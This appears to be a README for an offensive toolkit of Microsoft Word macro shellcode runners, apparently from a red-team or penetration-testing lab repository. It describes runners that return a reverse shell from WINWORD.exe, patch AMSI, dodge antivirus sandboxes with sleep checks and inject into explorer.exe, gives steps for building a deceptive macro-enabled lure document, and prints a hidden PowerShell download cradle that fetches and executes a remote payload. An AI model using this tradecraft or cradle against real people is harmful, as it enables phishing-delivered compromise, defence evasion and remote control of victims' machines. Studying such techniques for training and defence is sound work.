# Macro Shellcode Runners

## ToC

| Application | Notes |
| ----------- | ----- |
| `WordMacroRunner.vbs` | Baseline runner that will return a shell from WINWORD.exe, bypass AMSI, & run on both 64-bit and 32-bit |
| `WordMacroRunnerBasic.vbs` | Basic shellcode runner. `WordMacroRunner.vbs` without AMSI bypass or IP check |
| `WordMacroInject.vbs` | Inject into `explorer.exe` (*only good for 64-bit word*) | 
| `WordPsCradle.vbs` | Macro with Caesar Cipher encoding that calls a PS download cradle |
| `vbObfuscate.ps1` | PS script to generate Caesar Cipher code for `WordPsCradle.vbs` |


### Setup/formatting information:
1. Write "legitimate" contents of the word doc, select all, then navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery
2. Give it a name, make sure it's saved to that particular document and not a template. Hit ok. Then delete the content from the body of the word doc.
3. Copy in/write your pretexting content to the body of the word doc.  This is the piece that include "enable macros, hit this key combo to execute" etc.
4. Go to Macro's and click record new macro.  Ensure on both screens you select the current document and not a template.  Click keyboard and then hit a key combination to map (e.g. Alt + D).  Once you hit ok/close, recording will begin.  Then go click macros again, view, select the main runner sub, and then click run.  This will map that sequence to Alt + D so that when it is entered the runner sub will be executed.

## `WordMacroRunner.vbs`
This is a baseline runner that will return a shell from WINWORD.exe. Has capabilities to detect AMSI and patch it if found (for both 32-bit and 64 bit) as well as contains shellcode for both 32-bit and 64 bit Word so it can execute after detecting architecture. 

The only apparent obfuscation on the shellcode itself is that its written in an integer array, no encoding/encrypting. Uses sleep calls to determine if being simulated by AV. Also makes sure the target is in the `192.168.0.0/16` IP range.

## `WordMacroRunnerBasic.vbs`
This is just a basic version of `WordMacroRunner.vbs` without AMSI Bypass or IP Check.

## `WordPsCradle.vbs`
Macro with Caesar Cipher encoding that calls a PowerShell download cradle.  Use with `vbObfuscate.ps1` to generate and replace obfuscated text in `WordPsCradle.vbs`. This uses WMI dechaining, so **still use x64 shellcode even if you are targeting x86 word**!

## `vbObfuscate.ps1`
Powershell script to generate Caesar Cipher code for `WordPsCradle.vbs`.  Make sure offsets match for encrypt/decrypt. First output is download cradle, last is app name for app name check before running. 

**This is where you would edit the PS Cradle you would like to run**. The default is:
```ps1
powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.49.66/attach.txt')
```

## `WordMacroInject.vbs`
This macro performs process injection.  Currently injects into  `explorer.exe` in 64-bit word, and `WINWORD.exe` in 32-bit Word. Migration should be performed ASAP before Microsoft Word is closed by the victim if run on 32-bit. 

Uses sleep calls to determine if being simulated by AV. The shellcode is not obfuscated at all, that is left up to the reader.

### Notes
*This runner is really only stable for 64-bit word*, because of the lack of suitable 32-bit injection targets on a 64-bit OS.  Seeing as we have no idea what version of word an organization will be running, the use case for this is limited. 

> Starting in Word 2019 the program is 64 bit by default. This means Word 2019,O365,2021 are all good candidates for Injection because Orgs/individuals would have to go out of their way to have downloaded the 32 bit one.

*The issue stems from the fact that 32 bit processes cannot easily inject into 64 bit ones*. The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossible.

There are advanced techniques out there that might be able to facilitate this (*Heaven's gate*) but no idea if they could be implemented in VBA. Additionally there is no telling what/if any other 32 bit processes suitable for injection might be running on a target machine, other than `WINWORD.exe` at least momentarily.

In theory code could be written to enumerate running 32 bit processes and then just try to inject into an arbitrary one, but there are obvious issues concerning stability, and longevity of the process to maintain a reverse shell.  In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
